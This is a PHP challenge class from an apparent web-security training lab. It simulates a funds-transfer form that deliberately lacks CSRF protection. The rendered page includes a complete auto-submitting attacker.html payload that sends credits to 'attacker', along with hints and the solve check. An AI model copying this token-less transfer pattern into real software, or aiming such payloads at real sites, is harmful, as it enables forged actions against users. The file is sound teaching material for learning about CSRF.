<?php

namespace Labs\CSRF\Challenges;

use App\Core\BaseChallenge;
use App\Core\Session;

class Level1CSRF extends BaseChallenge
{
  private string $action = '';
  private string $message = '';
  private bool $solved = false;
  private int $balance = 1000;

  public function handle(): void
  {
    // Check if already solved
    if (Session::get('csrf_lvl1_solved') === true) {
      $this->solved = true;
    }

    // Initialize balance in session if not set
    if (!Session::has('csrf_balance')) {
      Session::set('csrf_balance', $this->balance);
    }

    // Handle transfer action (vulnerable - no CSRF token)
    if ($this->isPost() && isset($_POST['transfer_to'], $_POST['amount'])) {
      $transferTo = $_POST['transfer_to'];
      $amount = (int)$_POST['amount'];
      
      $currentBalance = Session::get('csrf_balance', 1000);
      
      if ($amount > 0 && $amount <= $currentBalance) {
        // Process the transfer (vulnerable!)
        $newBalance = $currentBalance - $amount;
        Session::set('csrf_balance', $newBalance);
        
        $this->action = "Transferred {$amount} credits to agent {$transferTo}";
        $this->message = "Transfer successful! Remaining balance: {$newBalance}";
        
        // Check if attacker's account received funds (for solving)
        if (strtolower($transferTo) === 'attacker' || strtolower($transferTo) === 'hacker') {
          Session::set('csrf_lvl1_solved', true);
          $this->solved = true;
          // markCompleted() will be called in validate() instead
        }
      } else {
        $this->message = "Invalid transfer amount or insufficient funds.";
      }
    }

    // Reset balance action
    if ($this->isPost() && isset($_POST['reset_balance'])) {
      Session::set('csrf_balance', 1000);
      Session::delete('csrf_lvl1_solved');
      $this->solved = false;
      $this->message = "Balance reset to 1000 credits.";
    }
  }

  public function render(): void
  {
    include_once ROOT . '/shared/military-ui/header.php';
?>
<div class="mil-content-wrapper">
  <div class="terminal-container">
    <!-- Header -->
    <div class="terminal-header">
      <h1><i class="fas fa-exchange-alt"></i> FUNDS TRANSFER TERMINAL – CSRF Lab (Level 1)</h1>
      <p class="terminal-subtitle">Cross-Site Request Forgery Vulnerability</p>
    </div>

    <!-- Objective -->
    <div class="mission-briefing">
      <div class="briefing-icon"><i class="fas fa-bullseye"></i></div>
      <div class="briefing-content">
        <h3>Mission Objective</h3>
        <p>Craft a malicious HTML page that tricks authenticated users into transferring funds to the attacker's account. The transfer form has no CSRF protection.</p>
        <p class="hint-text">Create an HTML file with an auto-submitting form that POSTs to <code>?page=csrf&lvl=1</code> with fields <code>transfer_to=attacker</code> and <code>amount=500</code>.</p>
      </div>
    </div>

    <!-- Current Balance -->
    <div class="info-panel">
      <div class="info-item">
        <span class="info-label">Current Balance:</span>
        <span class="info-value"><?= Session::get('csrf_balance', 1000) ?> credits</span>
      </div>
      <div class="info-item">
        <span class="info-label">Status:</span>
        <span class="info-value <?= $this->solved ? 'text-success' : 'text-warning' ?>">
          <?= $this->solved ? 'COMPROMISED' : 'SECURE' ?>
        </span>
      </div>
    </div>

    <!-- Message Display -->
    <?php if (!empty($this->message)): ?>
    <div class="alert-box <?= strpos($this->message, 'successful') !== false ? 'alert-success' : 'alert-error' ?>">
      <i class="fas fa-info-circle"></i> <?= htmlspecialchars($this->message) ?>
    </div>
    <?php endif; ?>

    <!-- Vulnerable Transfer Form -->
    <div class="terminal-form">
      <h2><i class="fas fa-paper-plane"></i> Initiate Funds Transfer</h2>
      <form method="POST" class="mil-form">
        <div class="form-group">
          <label for="transfer_to">Recipient Agent Codename:</label>
          <input type="text" id="transfer_to" name="transfer_to" required 
                 class="mil-input" placeholder="Enter agent codename">
        </div>
        <div class="form-group">
          <label for="amount">Amount (credits):</label>
          <input type="number" id="amount" name="amount" min="1" max="1000" required 
                 class="mil-input" placeholder="Enter amount" value="100">
        </div>
        <button type="submit" class="mil-btn mil-btn-primary">
          <i class="fas fa-play"></i> EXECUTE TRANSFER
        </button>
      </form>
      
      <form method="POST" style="margin-top: 1rem;">
        <button type="submit" name="reset_balance" class="mil-btn mil-btn-secondary">
          <i class="fas fa-redo"></i> RESET SIMULATION
        </button>
      </form>
    </div>

    <!-- Attack Example -->
    <div class="code-panel">
      <h3><i class="fas fa-code"></i> Attacker's Payload Example</h3>
      <pre><code>&lt;!-- attacker.html --&gt;
&lt;html&gt;
&lt;body onload="document.forms[0].submit()"&gt;
  &lt;form action="http://localhost/?page=csrf&amp;lvl=1" method="POST"&gt;
    &lt;input type="hidden" name="transfer_to" value="attacker"&gt;
    &lt;input type="hidden" name="amount" value="500"&gt;
  &lt;/form&gt;
&lt;/body&gt;
&lt;/html&gt;</code></pre>
    </div>

    <!-- Success Message -->
    <?php if ($this->solved): ?>
    <div class="success-banner">
      <i class="fas fa-check-circle"></i>
      <div>
        <h3>MISSION ACCOMPLISHED</h3>
        <p>You successfully exploited the CSRF vulnerability. The victim transferred funds without their knowledge.</p>
      </div>
    </div>
    <?php endif; ?>

    <!-- Hint Section -->
    <details class="intel-briefing">
      <summary><i class="fas fa-book"></i> Intelligence Briefing (Hint)</summary>
      <div class="briefing-details">
        <p>CSRF attacks trick users into performing actions they didn't intend. Since there's no CSRF token validation, any website can submit forms to this endpoint.</p>
        <p>Create a malicious HTML page with an auto-submitting form and trick the user into visiting it while logged in.</p>
      </div>
    </details>
  </div>
</div>

<style>
.mil-content-wrapper { padding: 20px; }
.terminal-container { max-width: 900px; margin: 0 auto; }
.terminal-header h1 { color: #00ff41; font-size: 1.5rem; margin-bottom: 0.5rem; }
.terminal-subtitle { color: #008f11; font-size: 0.9rem; }
.mission-briefing { background: rgba(0, 255, 65, 0.1); border-left: 3px solid #00ff41; padding: 15px; margin: 20px 0; display: flex; gap: 15px; }
.briefing-icon { font-size: 2rem; color: #00ff41; }
.briefing-content h3 { color: #00ff41; margin: 0 0 10px 0; }
.briefing-content p { color: #c0c0c0; margin: 5px 0; }
.hint-text { font-style: italic; color: #888; }
.info-panel { background: rgba(255, 255, 255, 0.05); padding: 15px; margin: 20px 0; display: flex; gap: 30px; }
.info-label { color: #888; }
.info-value { color: #00ff41; font-weight: bold; }
.text-success { color: #00ff41 !important; }
.text-warning { color: #ffaa00 !important; }
.alert-box { padding: 15px; margin: 15px 0; border-radius: 4px; }
.alert-success { background: rgba(0, 255, 65, 0.2); border: 1px solid #00ff41; color: #00ff41; }
.alert-error { background: rgba(255, 170, 0, 0.2); border: 1px solid #ffaa00; color: #ffaa00; }
.terminal-form { background: rgba(0, 0, 0, 0.3); padding: 20px; margin: 20px 0; border: 1px solid #333; }
.terminal-form h2 { color: #00ff41; margin-bottom: 20px; }
.mil-form .form-group { margin-bottom: 15px; }
.mil-form label { display: block; color: #888; margin-bottom: 5px; }
.mil-input { width: 100%; padding: 10px; background: #111; border: 1px solid #333; color: #00ff41; font-family: monospace; }
.mil-input:focus { outline: none; border-color: #00ff41; }
.mil-btn { padding: 10px 20px; border: none; cursor: pointer; font-family: monospace; text-transform: uppercase; }
.mil-btn-primary { background: #00ff41; color: #000; }
.mil-btn-primary:hover { background: #00cc33; }
.mil-btn-secondary { background: #333; color: #888; }
.code-panel { background: #0a0a0a; padding: 15px; margin: 20px 0; border: 1px solid #333; }
.code-panel h3 { color: #00ff41; margin-bottom: 10px; }
.code-panel pre { background: #111; padding: 15px; overflow-x: auto; color: #0f0; }
.success-banner { background: rgba(0, 255, 65, 0.2); border: 2px solid #00ff41; padding: 20px; margin: 20px 0; display: flex; gap: 20px; align-items: center; }
.success-banner i { font-size: 3rem; color: #00ff41; }
.success-banner h3 { color: #00ff41; margin: 0; }
.intel-briefing { background: rgba(255, 255, 255, 0.05); padding: 15px; margin: 20px 0; cursor: pointer; }
.intel-briefing summary { color: #00ff41; font-weight: bold; }
.briefing-details { padding: 15px 0 0 20px; color: #888; border-left: 2px solid #333; margin-top: 10px; }
</style>
<?php
    include_once ROOT . '/shared/military-ui/footer.php';
  }

  public function validate(): bool
  {
    $solved = Session::get('csrf_lvl1_solved') === true;
    if ($solved) {
      $this->markCompleted('csrf', 'lvl1');
    }
    return $solved;
  }
}
